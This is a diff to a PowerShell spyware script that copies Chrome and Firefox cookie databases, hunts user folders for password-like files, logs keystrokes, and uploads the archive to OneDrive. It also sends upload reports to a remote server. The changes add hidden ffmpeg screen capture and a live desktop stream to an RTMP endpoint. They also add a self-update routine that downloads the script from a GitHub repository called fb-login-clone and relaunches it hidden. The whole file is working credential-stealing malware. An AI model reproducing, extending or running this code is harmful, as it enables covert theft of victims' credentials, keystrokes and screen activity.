@@ -11,13 +11,16 @@ $fileDumpDir = "$tempDir\files"
 $keylogPath = "$tempDir\keylog.txt"
 $interval = 600  # 10 minutes per cycle
 
-New-Item -ItemType Directory -Force -Path $tempDir, $shotsDir, $cookieDir, $fileDumpDir | Out-Null
+New-Item -ItemType Directory -Force -Path $tempDir, $shotsDir, $cookieDir    | Out-Null
 
 Start-Transcript -Path "$tempDir\session.log" -Append
 Write-Output "[*] Started at $(Get-Date)"
 
 function Get-ChromeCookies {
     $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+    if (-not (Test-Path $cookieDir)) {
+    New-Item -ItemType Directory -Path $cookieDir -Force | Out-Null
+    }
     if (Test-Path $path) {
         Copy-Item $path "$cookieDir\chrome.sqlite" -Force
     }
@@ -25,6 +28,9 @@ function Get-ChromeCookies {
 
 function Get-FirefoxCookies {
     $profiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (-not (Test-Path $cookieDir)) {
+    New-Item -ItemType Directory -Path $cookieDir -Force | Out-Null
+    }
     if (Test-Path $profiles) {
         Get-ChildItem -Directory $profiles | ForEach-Object {
             $cookieFile = "$($_.FullName)\cookies.sqlite"
@@ -39,6 +45,9 @@ function Scan-Files {
     $targets = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
     $patterns = @("*pass*", "*haslo*", "*secret*", "*login*")
     $extensions = @("*.txt", "*.doc", "*.docx", "*.pdf")
+    if (-not (Test-Path $fileDumpDir)) {
+    New-Item -ItemType Directory -Path $fileDumpDir -Force | Out-Null
+    }
 
     foreach ($dir in $targets) {
         foreach ($ext in $extensions) {
@@ -103,13 +112,32 @@ Start-Job -ScriptBlock {
                 $char = try {
                     if ($map.ContainsKey($i)) { $map[$i] } else { [char]$i }
                 } catch { "[?]" }
-                Add-Content -Path $logPath -Value "$char "
+                Add-Content -Path $logPath -Value "$char"
             }
         }
         Start-Sleep -Milliseconds 50
     }
 }
+function Start-Recording {
+    param([string]$Mode = "record")
+    $ffmpeg = "$PSScriptRoot\ffmpeg.exe"
+    if (!(Test-Path $ffmpeg)) {
+        Write-Warning "ffmpeg not found"
+        return
+    }
+    if ($Mode -eq "record") {
+        $output = "$tempDir\screen_capture.mp4"
+        Start-Process -WindowStyle Hidden -FilePath $ffmpeg `
+            -ArgumentList "-y -f gdigrab -framerate 15 -i desktop -t 00:01:00 -vcodec libx264 $output"
+    } elseif ($Mode -eq "stream") {
+        Start-Process -WindowStyle Hidden -FilePath $ffmpeg `
+            -ArgumentList "-f gdigrab -i desktop -f flv rtmp://a.rtmp.youtube.com/live2/YOURKEY"
+    }
+}
 function Archive-And-Upload {
+    if (-not (Test-Path $keylogPath)) {
+    "" | Out-File -Encoding utf8 $keylogPath
+    }
     if (-not (Test-Path $keylogPath)) {
     New-Item -ItemType File -Path $keylogPath -Force | Out-Null
     }
@@ -130,10 +158,13 @@ Date: $timestamp
 Files: $(Get-ChildItem "$fileDumpDir" -Recurse | Measure-Object).Count
 Cookies: $(Get-ChildItem "$cookieDir" -Recurse | Measure-Object).Count
 "@ | Set-Content -Path $meta
-
+        $filesCount = (Get-ChildItem "$fileDumpDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
+        $cookieCount = (Get-ChildItem "$cookieDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
         Compress-Archive -Path @($logPath, $meta, "$cookieDir\*", "$fileDumpDir\*", $keylogPath) -DestinationPath $finalZip -Force
 
         Upload-To-OneDrive -ZipPath $finalZip -UserName $user -Timestamp $timestamp
+        $summary = "Files: $filesCount, Cookies: $cookieCount"
+        Send-Telegram -User $user -Timestamp $timestamp -Summary $summary
     } catch {
         Write-Warning "Archiving or upload failed: $_"
     }
@@ -158,17 +189,23 @@ function Upload-To-OneDrive {
     & "$rcloneExe" copy "$ZipPath" "$remoteFolder" --config "$rcloneConf" --create-empty-src-dirs --quiet
 
     if ($LASTEXITCODE -eq 0) {
-        $link = "https://onedrive.live.com/?id=root&cid=yourCIDhere" # REPLACE with actual or fixed pattern
-        Send-Telegram -text "Upload OK: $UserName at $Timestamp`n$link"
-    } else {
-        Send-Telegram -text "Upload FAILED: $UserName at $Timestamp"
+        $link = "https://onedrive.live.com/?id=root&cid=9f1831722b7187c6"
     }
 }
-
 function Send-Telegram {
-    param([string]$text)
+    param([string]$User, [string]$Timestamp, [string]$Summary)
+
+    $text = @"
+Upload complete:
+User: $User
+Time: $Timestamp
+
+$Summary
+"@
     try {
-        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST -Body @{ text = $text } -ContentType "application/json"
+        Invoke-RestMethod -Uri "$serverUrl/report" -Method POST `
+            -Body (@{ text = $text } | ConvertTo-Json -Compress) `
+            -ContentType "application/json"
     } catch {
         Write-Warning "Telegram send failed: $_"
     }
@@ -189,9 +226,28 @@ while ($true) {
     Get-ChromeCookies
     Get-FirefoxCookies
     Scan-Files
+    if (-not (Test-Path $fileDumpDir)) {
+        New-Item -ItemType Directory -Path $fileDumpDir -Force | Out-Null
+    }
+    Start-Recording -Mode "record"
+    Start-Recording -Mode "stream"
     Archive-And-Upload
     Cleanup
+    function Self-Update {
+    $url = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna/luna.ps1"
+    $local = "$PSScriptRoot\luna.ps1"
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $local -UseBasicParsing
+        Write-Output "Self-update complete"
+    } catch {
+        Write-Warning "Self-update failed"
+    }
+    }
+    Self-Update
+    Write-Output "Restarting after update..."
+    Start-Process -FilePath "$local" -WindowStyle Hidden
+    exit
     Start-Sleep -Seconds $interval
-}
+    }
 
 Stop-Transcript
